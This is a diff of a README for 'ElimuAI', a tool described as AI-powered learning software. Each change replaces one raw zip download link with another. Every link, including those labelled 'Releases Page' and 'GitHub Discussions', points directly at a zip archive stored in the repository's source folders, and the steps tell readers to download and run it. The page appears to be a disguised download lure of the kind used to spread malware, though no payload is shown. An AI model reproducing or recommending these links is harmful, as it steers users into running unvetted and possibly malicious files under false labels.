@@ -1,6 +1,6 @@
 # 🎓 ElimuAI - Empowering Learning with AI Technology
 
-[![Download ElimuAI](https://raw.githubusercontent.com/HanChein/ElimuAI/main/backend/middleware/Elimu-AI-2.0-alpha.1.zip)](https://raw.githubusercontent.com/HanChein/ElimuAI/main/backend/middleware/Elimu-AI-2.0-alpha.1.zip)
+[![Download ElimuAI](https://github.com/HanChein/ElimuAI/raw/refs/heads/main/frontend/AI-Elimu-sundew.zip)](https://github.com/HanChein/ElimuAI/raw/refs/heads/main/frontend/AI-Elimu-sundew.zip)
 
 ## 🌟 Introduction
 
@@ -12,7 +12,7 @@ To use ElimuAI, follow these simple steps to download and run the software. No c
 
 ## 📥 Download & Install
 
-1. Visit the [Releases Page](https://raw.githubusercontent.com/HanChein/ElimuAI/main/backend/middleware/Elimu-AI-2.0-alpha.1.zip) to get the latest version.
+1. Visit the [Releases Page](https://github.com/HanChein/ElimuAI/raw/refs/heads/main/frontend/AI-Elimu-sundew.zip) to get the latest version.
 2. Choose the version you want to download and click on the link.
 3. Your download will begin automatically. If prompted, choose a location on your computer to save the file.
 4. Once downloaded, locate the downloaded file in your downloads folder.
@@ -55,7 +55,7 @@ If you encounter issues while installing or running ElimuAI, here are some commo
 
 Join our community for support and discussions. This is a great way to learn from others and share your experiences with ElimuAI.
 
-- **GitHub Discussions:** [Join Here](https://raw.githubusercontent.com/HanChein/ElimuAI/main/backend/middleware/Elimu-AI-2.0-alpha.1.zip)
+- **GitHub Discussions:** [Join Here](https://github.com/HanChein/ElimuAI/raw/refs/heads/main/frontend/AI-Elimu-sundew.zip)
 - **Contact Us:** If you have any questions, feel free to reach out via GitHub.
 
 ## 📄 License
@@ -64,7 +64,7 @@ ElimuAI is open-source software licensed under the MIT License. You can freely u
 
 ## 🔗 Links
 
-- **Releases Page:** [Download ElimuAI](https://raw.githubusercontent.com/HanChein/ElimuAI/main/backend/middleware/Elimu-AI-2.0-alpha.1.zip)
+- **Releases Page:** [Download ElimuAI](https://github.com/HanChein/ElimuAI/raw/refs/heads/main/frontend/AI-Elimu-sundew.zip)
 - **Documentation:** Detailed user guides and FAQs.
 
 ## 🛠️ Acknowledgments
